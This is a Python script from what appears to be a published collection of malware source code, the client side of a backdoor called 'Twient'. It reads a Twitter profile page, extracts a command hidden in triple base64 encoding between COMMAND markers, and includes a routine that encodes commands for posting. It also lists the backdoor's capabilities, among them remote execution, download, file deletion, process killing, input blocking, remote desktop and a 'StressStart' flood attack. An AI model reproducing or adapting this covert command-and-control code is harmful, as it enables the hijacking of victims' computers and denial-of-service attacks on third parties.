'''
https://github.com/Voraka/Malware_Sourcecode/tree/master/Backdoor/Twient
'''

import os, sys
import string
import base64
from urllib import urlopen


def de_base64(buf):
	return base64.b64decode(buf)
	
def en_base64(buf):
	return base64.b64encode(buf)

def get_between(s, str1, str2):
	between_str = ""
	i = s.find(str1)	
	if i!=-1:
		i = i+len(str1)
		j = s.find(str2)
		between_str = s[i:j]	
	return between_str

	
def read_twitter():
	url = "https://twitter.com/voraka163"
	html = urlopen(url).read()
	return html 
	
def generate_cmd():
	cmd_str = ""
	cmd1 = "COMMAND"	
	cmd2 = "COMMAND_END"
	cmd = "Windowtitle"
	cut = "-CUT-"
	param1 = "You're hacked!"
	# param2 = "c:\\v-hacker.png"
	# cmd_str = cmd+cut+param1+cut+param2	
	cmd_str = cmd+cut+param1
	cmd_str_en = en_base64(en_base64(en_base64(cmd1)))+en_base64(en_base64(en_base64(cmd_str)))+en_base64(en_base64(en_base64(cmd2)))
	print len(cmd_str_en)
	return cmd_str_en
	
cmd1 = "COMMAND"	
cmd2 = "COMMAND_END"
commands = [
"FileAttribute",
"crasher",	#WriteProcessMemory (hexcode: A1 FC FF FF FF 99 F7 3D FC FF FF FF A3 F8 FF FF FF A1 F8 FF FF FF)
"closeFileMgr",
"FileMgr",	#GetDrivers info
"panic",	#AutoStart
"CLOSETCP",
"Monitor_off",
"Monitor_on",
"Taskbar_off",
"Taskbar_on",
"Desktop_off",
"Desktop_on",
"Blockinput_on",
"Blockinput_off",
"Messagebox",
"Hidewindow",
"Shutdown",
"Logoff",
"Restart",
"critical_off",
"critical_on",
"Delete",
"Execute",
"crash",
"Swapmousebuttons_on", #swap mouse
"Swapmousebuttons_off",
"Download",
"Beeper_on",
"Beeper_off",
"Beeper_Bomb",
"Restart_client",
"Close_Client",
"Killprocess",
"Windowtitle", #set window title
"Crazymouse", #set random SetCursorPos
"Remotedesktop_on",
"Remotedesktop_off",
"BatchScripting",
"StressStart",	# flood attack
"StressStop"
]

html = read_twitter()
cmd1 = "COMMAND"	
cmd2 = "COMMAND_END"
cmd = de_base64(de_base64(de_base64(get_between(html, en_base64(en_base64(en_base64(cmd1))), en_base64(en_base64(en_base64(cmd2)))))))
print cmd
# cmd = generate_cmd()
# print cmd



